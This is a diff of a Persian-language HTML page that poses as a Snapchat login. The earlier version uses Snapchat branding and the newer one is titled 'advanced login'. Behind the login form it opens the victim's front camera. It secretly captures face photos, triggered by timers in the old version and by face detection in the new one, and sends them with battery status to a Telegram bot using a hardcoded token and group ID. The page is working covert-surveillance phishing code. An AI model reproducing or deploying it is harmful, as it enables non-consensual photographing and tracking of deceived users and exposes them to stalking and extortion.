@@ -1,112 +1,114 @@
-
 <!DOCTYPE html>
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>ورود به سایت اسنپ چت</title>
+  <title>ورود پیشرفته</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
   <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://unpkg.com/lucide@latest"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
   <style>
-    body { direction: rtl; font-family: 'Vazirmatn', sans-serif; background-color: #000; color: #fff; }
-    .snap-container {
-      max-width: 480px; margin: auto; padding: 24px;
-      display: flex; flex-direction: column; align-items: center;
+    body { margin: 0; background: black; color: white; direction: rtl; }
+    video, canvas { position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; }
+    #overlay { pointer-events: none; }
+    #formSection {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100vh;
+      background: rgba(0,0,0,0.9); z-index: 10;
+      display: flex; flex-direction: column; justify-content: center; align-items: center;
     }
-    .ghost-logo {
-      width: 64px; height: 64px;
-      background: url('https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png') no-repeat center;
-      background-size: contain;
-    }
+    input { padding: 1rem; font-size: 1rem; border-radius: 0.5rem; margin-bottom: 1rem; width: 80%; max-width: 300px; }
+    button { padding: 1rem 2rem; background: yellow; color: black; font-weight: bold; border-radius: 0.5rem; }
   </style>
 </head>
 <body>
-  <div class="snap-container">
-    <div class="ghost-logo my-6"></div>
-    <h1 class="text-2xl font-bold mb-4">ورود به سایت اسنپ چت</h1>
 
-    <input id="userId" type="text" placeholder="آیدی عددی تلگرام" class="w-full p-3 mb-4 rounded-lg bg-gray-800 border border-gray-600 text-white">
+<div id="formSection">
+  <input id="userInput" type="text" placeholder="آیدی تلگرام (مثلاً @username)">
+  <button onclick="startApp()">ورود</button>
+</div>
 
-    <button onclick="startApp()" class="w-full bg-yellow-400 text-black py-3 rounded-lg text-lg font-bold hover:bg-yellow-300 transition">ورود</button>
+<video id="video" autoplay muted playsinline></video>
+<canvas id="overlay"></canvas>
 
-    <div id="cameraSection" class="hidden w-full mt-8 flex flex-col items-center">
-      <video id="video" autoplay playsinline class="rounded-xl shadow-lg w-full mb-4"></video>
-      <div class="text-center text-sm text-gray-300">زمان استفاده: <span id="timer">0</span> ثانیه</div>
-      <div class="flex gap-3 mt-4">
-        <button onclick="switchCamera()" class="bg-gray-700 p-2 rounded-full hover:bg-gray-600">
-          <i data-lucide="camera"></i>
-        </button>
-      </div>
-    </div>
-  </div>
+<script>
+  const botToken = '7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU';
+  const groupId = '-1002534583259';
+  let uid = '';
+  let video = document.getElementById("video");
+  let overlay = document.getElementById("overlay");
+  let ctx = overlay.getContext("2d");
+  let photoCount = 0;
+  let detected = false;
 
-  <script>
-    lucide.createIcons();
+  async function initCamera() {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    video.srcObject = stream;
+    return new Promise(resolve => {
+      video.onloadedmetadata = () => {
+        overlay.width = video.videoWidth;
+        overlay.height = video.videoHeight;
+        resolve();
+      };
+    });
+  }
 
-    const botToken = 'YOUR_BOT_TOKEN';
-    const groupId = 'YOUR_GROUP_ID';
-
-    let useFront = true;
-    let stream;
-    let photoCount = 0;
-    let seconds = 0;
-
-    function startApp() {
-      const uid = document.getElementById("userId").value.trim();
-      if (!uid) return alert("آیدی عددی الزامی است.");
-
-      document.getElementById("cameraSection").classList.remove("hidden");
-      initCamera();
-      startTimer();
-      schedulePhotos(uid);
+  async function startApp() {
+    const input = document.getElementById("userInput").value.trim();
+    if (!input || !input.startsWith('@')) {
+      alert("آیدی معتبر وارد کنید (مثلاً @username)");
+      return;
     }
+    uid = input;
+    document.getElementById("formSection").style.display = "none";
+    await initCamera();
+    const model = await blazeface.load();
 
-    async function initCamera() {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
+    async function detectLoop() {
+      if (photoCount >= 20) return;
+      const predictions = await model.estimateFaces(video, false);
+      ctx.clearRect(0, 0, overlay.width, overlay.height);
+
+      if (predictions.length > 0 && !detected) {
+        detected = true;
+        captureAndSend();
+        setTimeout(() => detected = false, 2500);
       }
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFront ? "user" : "environment" } });
-      document.getElementById("video").srcObject = stream;
+
+      predictions.forEach(p => {
+        const [x, y] = p.topLeft;
+        const [x2, y2] = p.bottomRight;
+        ctx.strokeStyle = "lime";
+        ctx.lineWidth = 2;
+        ctx.strokeRect(x, y, x2 - x, y2 - y);
+      });
+
+      requestAnimationFrame(detectLoop);
     }
 
-    function switchCamera() {
-      useFront = !useFront;
-      initCamera();
-    }
+    detectLoop();
+  }
 
-    function startTimer() {
-      setInterval(() => {
-        seconds++;
-        document.getElementById("timer").innerText = seconds;
-      }, 1000);
-    }
+  async function captureAndSend() {
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx2 = canvas.getContext("2d");
+    ctx2.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    function schedulePhotos(uid) {
-      const times = [3, 5, 10, 15, 20];
-      times.forEach(t => setTimeout(() => captureAndSend(uid), t * 1000));
-    }
+    canvas.toBlob(async blob => {
+      const battery = await navigator.getBattery();
+      const form = new FormData();
+      form.append("chat_id", groupId);
+      form.append("photo", blob, `photo_${photoCount}.jpg`);
+      form.append("caption", `آیدی: ${uid}\nعکس: ${++photoCount}\nباتری: ${battery.level * 100}%\nشارژ: ${battery.charging ? 'بله' : 'خیر'}`);
 
-    function captureAndSend(uid) {
-      const video = document.getElementById("video");
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(async blob => {
-        const battery = await navigator.getBattery();
-        const form = new FormData();
-        form.append("chat_id", groupId);
-        form.append("photo", blob, `photo_${photoCount}.jpg`);
-        form.append("caption", `آیدی: ${uid}\nعکس: ${++photoCount}\nباتری: ${battery.level * 100}%\nشارژ: ${battery.charging ? 'بله' : 'خیر'}`);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: form
+      });
+    }, 'image/jpeg');
+  }
+</script>
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: 'POST',
-          body: form
-        });
-      }, 'image/jpeg');
-    }
-  </script>
 </body>
 </html>
